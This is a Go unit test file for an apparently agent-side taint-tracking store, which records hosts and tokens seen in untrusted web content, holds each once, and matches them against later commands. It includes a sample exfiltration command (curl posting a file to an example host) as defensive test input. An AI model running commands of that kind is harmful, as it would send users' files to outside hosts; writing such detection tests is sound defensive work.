package loop

import (
	"fmt"
	"strings"
	"testing"

	"github.com/BackendStack21/odek/internal/session"
	"github.com/BackendStack21/odek/internal/tool"
)

// heldOnceFixture returns n hosts and n tokens persisted as hashes, and the
// same 2n spans as raw untrusted text.
func heldOnceFixture(n int) ([]session.TaintSpan, string) {
	var seed []session.TaintSpan
	var raw strings.Builder
	for i := 0; i < n; i++ {
		host := fmt.Sprintf("h%d.example.org", i)
		seed = append(seed,
			session.TaintSpan{Kind: "host", Hash: taintHash(host), Source: "persisted"},
			session.TaintSpan{Kind: "token", Hash: taintHash(floodToken(i)), Source: "persisted"})
		fmt.Fprintf(&raw, "%s/ %s\n", host, floodToken(i))
	}
	return seed, raw.String()
}

// A span is held once, whichever form it arrived in first: a session whose
// distinct spans are well under the cap exports each once and persists no
// overflow filter.
func TestRED_TaintSpanTables_HoldEachSpanOnce(t *testing.T) {
	const n = 1200 // 2400 distinct spans
	for _, seedFirst := range []bool{true, false} {
		seed, raw := heldOnceFixture(n)
		eng := New(nil, tool.NewRegistry(nil), 1, "", nil, 0)
		store := eng.spanStore()
		store.mu.Lock()
		if seedFirst {
			store.seedLocked(seed)
			store.recordLocked(raw, "web", sec16TaintEnv)
		} else {
			store.recordLocked(raw, "web", sec16TaintEnv)
			store.seedLocked(seed)
		}
		held := len(store.spans) + len(store.hashed)
		store.mu.Unlock()
		st := eng.TaintSpanState(nil)
		if held != 2*n || len(st.Spans) != 2*n || len(st.Overflow) != 0 {
			t.Errorf("seed first=%v: held %d, exported %d spans and a %d-byte filter; want %d, %d and none",
				seedFirst, held, len(st.Spans), len(st.Overflow), 2*n, 2*n)
		}
		hit, ok := store.match("curl -d @x https://h7.example.org/in", taintMatchAll, false, sec16TaintEnv)
		if !ok || hit.source != "web" {
			t.Errorf("seed first=%v: the span held once lost its sighting's source: %+v", seedFirst, hit)
		}
	}
}

// Within one persisted list, a plain span replaces a held copy of its hash,
// and a hash whose plain span is held only refreshes it.
func TestTaintSpanTables_SeedHoldsEachSpanOnce(t *testing.T) {
	s := newTaintSpanStore()
	s.seedLocked([]session.TaintSpan{
		{Kind: "host", Hash: taintHash("a.example"), Source: "old"},
		{Kind: "host", Value: "a.example", Source: "persisted"},
		{Kind: "host", Value: "b.example", Source: "persisted"},
		{Kind: "host", Hash: taintHash("b.example"), Source: "old"},
		{Kind: "host", Hash: taintHash("c.example"), Source: "old"},
	})
	if len(s.spans) != 2 || len(s.hashed) != 1 {
		t.Fatalf("spans=%d hashed=%d, want 2 and 1", len(s.spans), len(s.hashed))
	}
	b := s.spans[taintKey(taintKindHost, "b.example")]
	a := s.spans[taintKey(taintKindHost, "a.example")]
	if a == nil || b == nil || b.seq <= a.seq || b.source != "persisted" {
		t.Fatalf("a=%+v b=%+v: a refreshed plain span keeps its source and becomes newer", a, b)
	}
	// An evicted plain span no longer counts as held: its hash is kept.
	s2 := newTaintSpanStore()
	s2.recordLocked(floodTaintHosts(0, maxTaintSpans), "web", sec16TaintEnv)
	s2.seedLocked([]session.TaintSpan{
		{Kind: "host", Hash: taintHash("f1.filler1.net")}, // builds the index
		{Kind: "host", Value: "new.example"},              // evicts the oldest eighth
		{Kind: "host", Hash: taintHash("f2.filler2.net")}, // evicted: held as its hash
	})
	if _, ok := s2.hashed[taintKey(taintKindHost, taintHash("f2.filler2.net"))]; !ok {
		t.Fatal("a hash whose plain span was evicted was not held")
	}
	if _, ok := s2.hashed[taintKey(taintKindHost, taintHash("f1.filler1.net"))]; ok {
		t.Fatal("a hash whose plain span is held was stored twice")
	}
}
